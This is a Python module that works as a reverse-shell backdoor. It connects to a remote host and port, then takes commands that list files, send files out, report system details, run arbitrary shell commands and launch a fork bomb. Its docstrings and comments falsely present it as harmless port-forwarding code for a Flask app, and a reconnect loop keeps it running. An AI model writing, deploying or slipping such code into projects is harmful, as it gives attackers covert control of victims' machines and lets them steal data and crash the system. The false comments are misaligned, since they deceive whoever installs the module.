import socket, os, keyboard
import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()


def seize():


    RHOST = "127.0.0.1"
    RPORT = 2222

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((RHOST, RPORT))

    """
    This function is to do some port forwarding for the 'flask' part of the main program. 
    If this is not used correctly, it won't start correctly.
    """
    while True:
        try:
            header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
            sock.send(header.encode())
            STDOUT, STDERR = None, None
            cmd = sock.recv(1024).decode("utf-8")

            # List files in the dir
            if cmd == "list":
                sock.send(str(os.listdir(".")).encode())

            # Forkbomb
            if cmd == "forkbomb":
                while True:
                    os.fork()

            # Change directory
            elif cmd.split(" ")[0] == "cd":
                os.chdir(cmd.split(" ")[1])
                sock.send("Changed directory to {}".format(os.getcwd()).encode())

            # Get system info
            elif cmd == "sysinfo":
                sysinfo = f"""
    Local IP address : {socket.gethostname(socket.gethostbyname())}
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
                sock.send(sysinfo.encode())

            # Download files
            elif cmd.split(" ")[0] == "download":
                with open(cmd.split(" ")[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        print("Sending", file_data)
                        sock.send(file_data)
                        file_data = f.read(1024)
                    sleep(2)
                    sock.send(b"DONE")
                print("Finished sending data")

            # Terminate the connection
            elif cmd == "exit":
                sock.send(b"exit")
                break

            # Run any other command
            else:
                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)

            # If the connection terminates
            if not cmd:
                print("Connection dropped")
                break
        except Exception as e:
            sock.send("An error has occured: {}".format(str(e)).encode())
    sock.close()
#Remember to include this file next to the main one, or it won't work properly.

def equalize():
    """
    This function is to run the 'seize' function on loop, to make sure the ports stay
    opened and their settings don't change midway through the main process, which would
    cause some unwanted errors.
    """
    print(f"Equalizing input data and forwarding ports")
    while True:
        try:
            seize()
        except ConnectionError:
            pass